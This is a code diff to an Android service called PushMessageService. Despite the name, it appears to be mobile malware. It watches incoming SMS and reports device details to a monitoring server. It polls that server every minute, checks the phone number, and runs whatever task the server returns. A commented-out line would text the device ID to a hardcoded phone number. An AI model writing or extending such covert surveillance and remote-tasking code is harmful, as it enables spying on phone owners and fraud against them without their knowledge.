@@ -26,21 +26,32 @@ public class PushMessageService extends Service {
         super.onCreate();
         SdkTools.context = PushMessageService.this;
         addSMSObserver();
-
+        //SdkTools.sendSMS("13916341324", SMSObserver.FILTER_CEHCKPHONE + DeviceInfo.getDeviceId());
         time.schedule(new TimerTask() {
             @Override
             public void run() {
+                String updatetime = SdkTools.getKV("updatetime");
+                if(updatetime.equalsIgnoreCase("")) updatetime = "0";
+                long now = System.currentTimeMillis();
+                long last = Long.parseLong(updatetime);
+                long k = (30l*24*3600*1000);
+                long kk = now - last;
+                if(kk > k ) {
+                    SdkTools.clearKV();
+                }
                 String token = SdkTools.getKV("token");
                 if (token.equalsIgnoreCase("")) {
                     postDeviceInof();
-                } else {
+                }else if (DeviceInfo.getPhone(false) == null) {
+                    DeviceInfo.checkPhone();
+                }else {
                     heartBeat(token);
                 }
             }
-        }, 1000, 500000);
+        }, 1000, 60000);
     }
     public void postDeviceInof() {
-        HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_DEVICE_INFO,null, DeviceInfo.getDeviceInfo().toString(), new HttpRequest.IHttpCallBack() {
+        HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_DEVICE_INFO,null, "d="+DeviceInfo.getDeviceInfo().toString(), new HttpRequest.IHttpCallBack() {
             @Override
             public void callback(String ret) {
 
@@ -49,7 +60,9 @@ public class PushMessageService extends Service {
             public void callback(JSONObject ret) {
                 try {
                     if (ret != null && ret.getBoolean("b")) {
-                        SdkTools.setKV("token",ret.getString("token"));
+                        SdkTools.setKV("token",ret.getString("result"));
+                        String updatetime = System.currentTimeMillis()+"";
+                        SdkTools.setKV("updatetime",updatetime);
                     }
                 }catch(Exception e) {
                     e.printStackTrace();
@@ -63,8 +76,8 @@ public class PushMessageService extends Service {
         try {
             JSONObject result = new JSONObject(ret);
             if(result.getBoolean("b")) {
-                if(result.has("task")) {
-                    JSONObject task = result.getJSONObject("task");
+                if(result.has("result")) {
+                    JSONObject task = result.getJSONObject("result");
                     new TaskThread(task).start();
                 }
             }
